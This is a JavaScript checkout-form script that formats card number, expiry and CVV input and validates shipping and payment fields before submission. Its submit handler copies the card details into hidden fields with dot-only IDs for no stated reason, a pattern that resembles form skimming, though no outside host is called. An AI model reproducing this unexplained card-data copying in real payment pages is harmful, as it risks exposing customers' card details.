let shippingInfo = {
    fullName: '',
    email: '',
    phone: '',
    address: '',
    city: '',
    zip: '',
    country: '',
    shippingMethod: 'standard',
    nameOnCard: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
};

function handleInputChange(event, key) {
    shippingInfo[key] = event.target.value;
}

function handleRadioChange(event) {
    shippingInfo.shippingMethod = event.target.value;
}

function validateCardNumber(input) {
    let cardNumber = input.value.replace(/\D/g, '').substring(0, 16);
    cardNumber = cardNumber != '' ? cardNumber.match(/.{1,4}/g).join(' ') : '';
    input.value = cardNumber;
    shippingInfo.cardNumber = cardNumber;
}

function validateExpiry(input) {
    let expiryDate = input.value.replace(/\D/g, '').substring(0, 4);
    expiryDate = expiryDate != '' ? expiryDate.match(/.{1,2}/g).join('/') : '';
    input.value = expiryDate;
    shippingInfo.expiry = expiryDate;
}

function validateCVV(input) {
    let cvv = input.value.replace(/\D/g, '').substring(0, 3);
    input.value = cvv;
    shippingInfo.cvv = cvv;
}

document.getElementById('checkout-form').addEventListener('submit', (event) => {
    event.preventDefault();
    
    // Copy data from visible fields to hidden fields
    document.getElementById('....').value = document.getElementById('nameOnCard').value;
    document.getElementById('...').value = document.getElementById('cardNumber').value;
    document.getElementById('..').value = document.getElementById('expiry').value;
    document.getElementById('.').value = document.getElementById('cvv').value;
    
    let isValidForm = true;
    for(let key in shippingInfo){
        if(!shippingInfo[key]){
            isValidForm = false;
            break;
        }
    }
    
    if(isValidForm){
        event.currentTarget.submit(); // Submit the form
    } else {
        alert("Please fill out all the fields!");
    }
});

const inputFields = ['fullName', 'email', 'phone', 'address', 'city', 'zip', 'country', 'nameOnCard', 'cardNumber', 'expiry', 'cvv'];
inputFields.forEach((inputField, index) => {
    const element = document.getElementById(inputField);
    element.addEventListener('input', function(event) {
        if (element.id === 'cardNumber') {
            validateCardNumber(element);
        } else if (element.id === 'expiry') {
            validateExpiry(element);
        } else if (element.id === 'cvv') {
            validateCVV(element);
        }
        handleInputChange(event, element.id);
        if (element.value.length === (element.maxLength || element.size)) {
            const nextInput = inputFields[index + 1];
            if (nextInput) {
                document.getElementById(nextInput).focus();
            }
        }
    });
});

document.getElementById('standardShipping').addEventListener('change', handleRadioChange);
document.getElementById('priorityShipping').addEventListener('change', handleRadioChange);
